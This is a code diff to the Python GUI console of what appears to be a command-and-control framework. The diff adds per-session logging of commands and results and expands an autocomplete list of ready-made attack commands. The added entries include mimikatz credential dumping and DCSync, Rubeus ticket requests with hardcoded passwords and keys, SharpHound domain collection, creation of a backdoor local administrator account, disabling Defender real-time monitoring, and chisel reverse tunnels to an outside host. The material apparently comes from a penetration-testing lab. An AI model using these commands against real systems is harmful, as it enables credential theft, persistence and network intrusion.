@@ -37,7 +37,7 @@ class ConsolesTab(QWidget):
         for currentQTableWidgetItem in self.tableWidget.selectedItems():
             print(currentQTableWidgetItem.row(), currentQTableWidgetItem.column(), currentQTableWidgetItem.text())
 
-    def addConsole(self, key):
+    def addConsole(self, key, hostname, username):
         tabAlreadyOpen=False
         for idx in range(0,self.tabs.count()):
             openTabKey = self.tabs.tabText(idx)
@@ -49,7 +49,7 @@ class ConsolesTab(QWidget):
             tab = QWidget()
             self.tabs.addTab(tab, key[0:8])
             tab.layout = QVBoxLayout(self.tabs)
-            console = Console(self, self.ip, self.port, key)
+            console = Console(self, self.ip, self.port, key, hostname, username)
             tab.layout.addWidget(console)
             tab.setLayout(tab.layout)
             self.tabs.setCurrentIndex(self.tabs.count()-1)
@@ -63,14 +63,20 @@ class ConsolesTab(QWidget):
 class Console(QWidget):
     tabPressed = pyqtSignal()
     key=""
+    hostname=""
+    username=""
+    logFileName=""
 
-    def __init__(self, parent, ip, port, key):
+    def __init__(self, parent, ip, port, key, hostname, username):
         super(QWidget, self).__init__(parent)
         self.layout = QVBoxLayout(self)
 
         self.grpcClient = GrpcClient(ip, port)
 
         self.key=key
+        self.hostname=hostname.replace("\\", "_").replace(" ", "_")
+        self.username=username.replace("\\", "_").replace(" ", "_")
+        self.logFileName=self.hostname+"_"+self.username+"_"+self.key+".log"
 
         self.editorOutput = QPlainTextEdit()
         self.editorOutput.setFont(QFont("Courier"));
@@ -121,6 +127,12 @@ class Console(QWidget):
             cmdHistoryFile.write(commandLine)
             cmdHistoryFile.write('\n')
             cmdHistoryFile.close()
+
+            logFile = open("./logs/"+self.logFileName, 'a')
+            logFile.write('[+] send: \"' + commandLine + '\"')
+            logFile.write('\n')
+            logFile.close()
+
             self.commandEditor.setCmdHistory()
             instructions = commandLine.split()
             if instructions[0]=="help":
@@ -150,11 +162,17 @@ class Console(QWidget):
         responses = self.grpcClient.getResponseFromSession(session)
         for response in responses:
             self.setCursorEditorAtEnd()
-            line = '<p style=\"color:red;white-space:pre\">[+] result: \"' + response.instruction + " "+ response.cmd + '\"</p>'
+            line = '<p style=\"color:red;white-space:pre\">[+] result: \"' + response.instruction + " " + response.cmd + '\"</p>'
             self.editorOutput.appendHtml(line)
             line = '\n' + response.response.decode(encoding="ascii", errors="ignore")  + '\n'
             self.editorOutput.insertPlainText(line)
             self.setCursorEditorAtEnd()
+
+            logFile = open("./logs/"+self.logFileName, 'a')
+            logFile.write('[+] result: \"' + response.instruction + " " + response.cmd + '\"')
+            logFile.write('\n' + response.response.decode(encoding="ascii", errors="ignore")  + '\n')
+            logFile.write('\n')
+            logFile.close()
 
     def setCursorEditorAtEnd(self):
         cursor = self.editorOutput.textCursor()
@@ -242,18 +260,27 @@ completerData = [
     ('sleep',[]),
     ('end',[]),
     ('listener',[
-             ('start', [
-                         ('smb pipename',[]),
-                         ('tcp 127.0.0.1 4444',[])
-                        ]),
-             ('stop',  [])
+            ('start smb pipename',[]),
+            ('start tcp 127.0.0.1 4444',[]),
+            ('stop',  []),
              ]),
     ('assemblyExec',[
-                    ('-e mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',  []),
-                    ('-e mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',  []),
+                    ('-e mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
+                    ('-e mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
+                    ('-e mimikatz.exe "sekurlsa::logonpasswords" "exit"',  []),
+                    ('-e mimikatz.exe "sekurlsa::ekeys" "exit"',  []),
+                    ('-e mimikatz.exe "lsadump::sam" "exit"',  []),
+                    ('-e mimikatz.exe "lsadump::cache" "exit"',  []),
+                    ('-e mimikatz.exe "lsadump::secrets" "exit"',  []),
                     ('-e SharpView.exe Get-DomainComputer',  []),
-                    ('-e Rubeus.exe triage',  []),
+                    ('-e Rubeus.exe triage',[]),
+                    ('-e Rubeus.exe purge',[]),
+                    ('-e Rubeus.exe asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
+                    ('-e Rubeus.exe s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
                     ('-e Seatbelt.exe -group=system',  []),
+                    ('-e Seatbelt.exe -group=system',[]),
+                    ('-e Seatbelt.exe -group=user',[]),
+                    ('-e SharpHound.exe -c All -d dev.admin.offshore.com',  []),
                     ]),
     ('upload',[]),
     ('run',[
@@ -263,7 +290,9 @@ completerData = [
              ('cmd /c where /r c:\\ *.txt',  []),
              ('cmd /c tasklist /SVC',  []),
              ('cmd /c taskkill /pid 845 /f',  []),
-             ('cmd /c schtasks /query /fo LIST /v',  [])
+             ('cmd /c schtasks /query /fo LIST /v',  []),
+             ('cmd /c net user superadmin123 Password123!* /add',  []),
+             ('cmd /c net localgroup administrators superadmin123  /add',  [])
              ]),
     ('download',[]),
     ('inject',[
@@ -355,13 +384,22 @@ completerData = [
     ('kerberosUseTicket',[]),
     ('powershell',[
                 ('-i PowerView.ps1',  []),
+                ('Get-Domain',  []),
+                ('Get-DomainTrust',  []),
+                ('Get-DomainUser',  []),
+                ('Get-DomainComputer -Properties DnsHostName',  []),
+                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
+                ('-i PowerUp.ps1',  []),
+                ('Invoke-AllChecks',  []),
+                ('-i Powermad.ps1',  []),
+                ('-i PowerUpSQL.ps1',  []),
                 ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
                 ]),
     ('chisel',[
                 ('status',  []),
                 ('stop',  []),
-                ('chisel.exe client 192.168.57.21:8080 R:socks',  []),
-                ('chisel.exe client 192.168.57.21:8080 R:445:192.168.57.14:445',  []),
+                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
+                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
                 ]),
     ('psExec',[
         ('implant.exe 10.10.10.10',  []),
